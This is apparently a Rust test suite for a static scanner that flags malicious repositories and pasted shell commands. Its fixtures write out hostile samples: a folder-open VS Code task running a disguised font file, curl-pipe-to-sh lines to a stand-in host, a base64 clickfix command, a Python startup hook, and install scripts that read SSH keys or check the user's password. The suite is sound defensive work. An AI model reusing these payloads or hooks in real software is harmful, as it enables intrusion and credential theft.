//! Lure-shaped folders built at test time. Nothing of this shape is committed, because an
//! editor that opens this repo would trust and run a real `.vscode/tasks.json`.

use std::fs;
use std::path::Path;

use bee_evidence::{Severity, Verdict};
use bee_static::{scan_command, scan_path};

fn write(root: &Path, rel: &str, body: &[u8]) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, body).unwrap();
}

fn rules(report: &bee_evidence::Report) -> Vec<&'static str> {
    report.evidence.iter().map(|e| e.rule).collect()
}

#[test]
fn fake_interview_repo() {
    let dir = tempfile::tempdir().unwrap();
    let r = dir.path();
    write(r, "package.json", br#"{"name":"take-home","scripts":{"start":"node server.js","prepare":"node scripts/setup.js"}}"#);
    write(
        r,
        ".vscode/tasks.json",
        br#"{
  "version": "2.0.0",
  "tasks": [{
    "label": "eslint-check",
    "command": "node",
    "args": ["public/font/fa-brands-regular.woff2"],
    "presentation": {"reveal": "never"},
    "runOptions": {"runOn": "folderOpen"}
  }]
}"#,
    );
    write(
        r,
        "public/font/fa-brands-regular.woff2",
        b"const {exec}=require('child_process');exec(process.env.X)",
    );
    write(r, "public/font/real.woff2", b"wOF2\x00\x01\x00\x00\x00\x00");
    write(
        r,
        "server/routes/settings.js",
        b"const axios = require('axios');\nmodule.exports = async () => {\n  const res = await axios.get(process.env.CFG);\n  new Function('require', res.data)(require);\n};\n",
    );
    write(
        r,
        "README.md",
        b"Run `curl https://x.invalid | bash` to install.",
    );

    let report = scan_path(r).unwrap();
    assert_eq!(report.verdict, Verdict::Dangerous);
    let found = rules(&report);
    for expected in [
        "folder-open-task",
        "runs-disguised-file",
        "disguised-file",
        "run-downloaded-code",
        "install-hook",
    ] {
        assert!(found.contains(&expected), "missing {expected}: {found:?}");
    }
    assert!(
        !found.contains(&"download-and-run"),
        "README is prose, not code: {found:?}"
    );
    assert_eq!(
        report
            .evidence
            .iter()
            .filter(|e| e.rule == "disguised-file")
            .count(),
        1
    );
    assert!(report.unchecked.iter().any(|u| u.contains("dependencies")));
    assert!(report.unchecked.iter().any(|u| u.contains("VS Code")));
    assert_eq!(report.evidence[0].id, "E1");
    assert_eq!(report.evidence[0].severity, Severity::Danger);
}

#[test]
fn ordinary_rust_project_has_no_red_flags() {
    let dir = tempfile::tempdir().unwrap();
    let r = dir.path();
    write(
        r,
        "Cargo.toml",
        b"[package]\nname = \"x\"\nversion = \"0.1.0\"\n",
    );
    write(r, "src/main.rs", b"fn main() { println!(\"hello\"); }\n");
    write(
        r,
        ".vscode/tasks.json",
        br#"{"version":"2.0.0","tasks":[{"label":"build","command":"cargo build"}]}"#,
    );
    write(r, "assets/logo.png", b"\x89PNG\r\n\x1a\n\x00\x00");

    let report = scan_path(r).unwrap();
    assert_eq!(
        report.verdict,
        Verdict::NoRedFlagsFound,
        "{:?}",
        report.evidence
    );
    assert!(report.evidence.is_empty());
    assert!(report.unchecked[0].contains("Nothing was run"));
}

#[test]
fn zipped_repo_with_git_tricks() {
    let dir = tempfile::tempdir().unwrap();
    let r = dir.path();
    write(r, "index.js", b"console.log(1)\n");
    write(
        r,
        ".git/config",
        b"[core]\n\tfsmonitor = \"node .git/fsm.js\"\n",
    );
    write(
        r,
        ".git/hooks/post-checkout",
        b"#!/bin/sh\ncurl -s https://x.invalid/p | sh\n",
    );
    write(
        r,
        ".git/hooks/pre-commit.sample",
        b"#!/bin/sh\ncurl -s https://x.invalid/p | sh\n",
    );
    write(
        r,
        ".git/objects/ab/cdef",
        b"curl -s https://x.invalid/p | sh\n",
    );

    let report = scan_path(r).unwrap();
    assert_eq!(report.verdict, Verdict::Dangerous);
    let hook_hits: Vec<_> = report
        .evidence
        .iter()
        .filter_map(|e| e.location.as_ref().map(|l| l.path.as_str()))
        .filter(|p| p.contains(".git/"))
        .collect();
    assert!(
        hook_hits
            .iter()
            .all(|p| !p.contains(".sample") && !p.contains("objects")),
        "{hook_hits:?}"
    );
    let found = rules(&report);
    assert!(found.contains(&"git-config-exec"));
    assert!(found.contains(&"git-hook"));
}

#[cfg(unix)]
#[test]
fn links_out_of_the_folder_are_reported_and_not_followed() {
    let outside = tempfile::tempdir().unwrap();
    write(
        outside.path(),
        "id_ed25519",
        b"curl -s https://x.invalid/p | sh\n",
    );
    let dir = tempfile::tempdir().unwrap();
    std::os::unix::fs::symlink(outside.path().join("id_ed25519"), dir.path().join("key.sh"))
        .unwrap();

    let report = scan_path(dir.path()).unwrap();
    let found = rules(&report);
    assert_eq!(found, vec!["link-outside-folder"]);
    assert!(report.unchecked.iter().any(|u| u.contains("link")));
}

#[test]
fn a_single_file_can_be_scanned() {
    let dir = tempfile::tempdir().unwrap();
    write(
        dir.path(),
        "install.sh",
        b"#!/bin/sh\ncurl -fsSL https://x.invalid/i | sh\n",
    );
    let report = scan_path(&dir.path().join("install.sh")).unwrap();
    assert_eq!(report.verdict, Verdict::Suspicious);
    assert_eq!(
        report.evidence[0].location.as_ref().unwrap().path,
        "install.sh"
    );
}

#[test]
fn compiled_programs_mean_could_not_tell() {
    let dir = tempfile::tempdir().unwrap();
    write(
        dir.path(),
        "bin/helper",
        b"\xcf\xfa\xed\xfe\x07\x00\x00\x01",
    );
    let report = scan_path(dir.path()).unwrap();
    assert_eq!(report.verdict, Verdict::CouldNotTell);
}

#[test]
fn pasted_installer_is_could_not_tell_not_safe() {
    let report = scan_command("curl --proto '=https' -sSf https://sh.rustup.rs | sh");
    assert_eq!(report.verdict, Verdict::CouldNotTell);
    assert!(report.unchecked.iter().any(|u| u.contains("sh.rustup.rs")));
}

#[test]
fn pasted_clickfix_is_dangerous() {
    let report =
        scan_command("echo Y3VybCAtcyBodHRwczovL3guaW52YWxpZCB8IHpzaA== | base64 -D | zsh");
    assert_eq!(report.verdict, Verdict::Dangerous);
}

#[test]
fn pasted_harmless_command() {
    let report = scan_command("ls -la ~/Downloads");
    assert_eq!(report.verdict, Verdict::NoRedFlagsFound);
    assert_eq!(
        report.unchecked,
        vec!["The command was not run.".to_string()]
    );
}

#[test]
fn installed_packages_are_reported_unread_not_scanned() {
    let dir = tempfile::tempdir().unwrap();
    let r = dir.path();
    write(r, "index.js", b"require('left-pad')\n");
    write(
        r,
        "node_modules/left-pad/index.js",
        b"require('child_process').execSync('curl -s https://x.invalid | sh')\n",
    );
    write(
        r,
        "target/CACHEDIR.TAG",
        b"Signature: 8a477f597d28d172789f06886806bc55\n",
    );
    write(
        r,
        "target/debug/build.sh",
        b"curl -s https://x.invalid | sh\n",
    );

    let report = scan_path(r).unwrap();
    assert_eq!(report.verdict, Verdict::CouldNotTell);
    assert_eq!(rules(&report), vec!["unread-folder"]);
    assert!(
        report.evidence[0].summary.starts_with("2 folder(s)"),
        "{}",
        report.evidence[0].summary
    );
}

#[test]
fn a_fetched_installer_replaces_could_not_tell_with_what_it_says() {
    use bee_static::{Fetch, scan_command_fetched};
    let cmd = "curl -fsSL https://x.invalid/install.sh | sh";
    let clean = Fetch::Got {
        url: "https://x.invalid/install.sh".into(),
        bytes:
            b"#!/bin/sh\nset -eu\n# no curl here\nmkdir -p \"$HOME/.local/bin\"\necho installed\n"
                .to_vec(),
    };
    let report = scan_command_fetched(cmd, &[clean]);
    assert_eq!(
        report.verdict,
        Verdict::NoRedFlagsFound,
        "{:?}",
        report.evidence
    );
    assert!(
        report
            .unchecked
            .iter()
            .any(|u| u.contains("was read, not run"))
    );

    let wrapper = Fetch::Got {
        url: "https://x.invalid/install.sh".into(),
        bytes: b"#!/bin/sh\ncurl -fsSL \"$BASE/tool.tgz\" -o /tmp/t.tgz\ntar xzf /tmp/t.tgz\n"
            .to_vec(),
    };
    let report = scan_command_fetched(cmd, &[wrapper]);
    assert_eq!(report.verdict, Verdict::CouldNotTell);
    assert_eq!(report.evidence[0].rule, "downloads-more");

    let stealer = Fetch::Got {
        url: "https://x.invalid/install.sh".into(),
        bytes: b"#!/bin/sh\ndscl . -authonly \"$USER\" \"$pw\"\n".to_vec(),
    };
    let report = scan_command_fetched(cmd, &[stealer]);
    assert_eq!(report.verdict, Verdict::Dangerous);
    assert_eq!(
        report.evidence[0].location.as_ref().unwrap().path,
        "https://x.invalid/install.sh"
    );

    let decoy = Fetch::Got {
        url: "https://x.invalid/install.sh".into(),
        bytes: b"<!DOCTYPE html><html><body>Nothing here</body></html>".to_vec(),
    };
    assert_eq!(
        scan_command_fetched(cmd, &[decoy]).verdict,
        Verdict::CouldNotTell
    );

    let failed = Fetch::Failed {
        url: "https://x.invalid/install.sh".into(),
        reason: "timed out".into(),
    };
    let report = scan_command_fetched(cmd, &[failed]);
    assert_eq!(report.verdict, Verdict::CouldNotTell);
    assert!(report.unchecked.iter().any(|u| u.contains("timed out")));
}

#[test]
fn a_wheel_that_runs_code_at_every_python_start() {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), "pkg/__init__.py", b"");
    write(
        dir.path(),
        "pkg-helper.pth",
        b"./pkg\nimport os; os.system('id')\n",
    );
    write(dir.path(), "plain.pth", b"./vendor\n");
    let report = scan_path(dir.path()).unwrap();
    assert_eq!(rules(&report), vec!["python-startup-hook"]);
    assert_eq!(report.evidence[0].location.as_ref().unwrap().line, Some(2));
}

#[test]
fn a_script_run_by_an_install_hook_is_read_as_auto_run() {
    let dir = tempfile::tempdir().unwrap();
    let r = dir.path();
    write(
        r,
        "package.json",
        br#"{"name":"x","scripts":{"postinstall":"node ./install.js"}}"#,
    );
    write(r, "install.js", b"const https = require('https');\nconst os = require('os');\nfs.readFileSync(os.homedir() + '/.ssh/id_ed25519');\n");
    write(
        r,
        "lib/other.js",
        b"fs.readFileSync(os.homedir() + '/.ssh/id_ed25519');\n",
    );
    let report = scan_path(r).unwrap();
    assert_eq!(report.verdict, Verdict::Dangerous);
    let at = |rule: &str, path: &str| {
        report
            .evidence
            .iter()
            .find(|e| e.rule == rule && e.location.as_ref().unwrap().path == path)
            .map(|e| e.severity)
    };
    assert_eq!(at("secret-store", "install.js"), Some(Severity::Danger));
    assert_eq!(at("secret-store", "lib/other.js"), Some(Severity::Warning));
    assert_eq!(at("downloads-more", "install.js"), Some(Severity::Opaque));
    assert_eq!(
        report
            .evidence
            .iter()
            .filter(|e| e.rule == "secret-store")
            .count(),
        2
    );
}
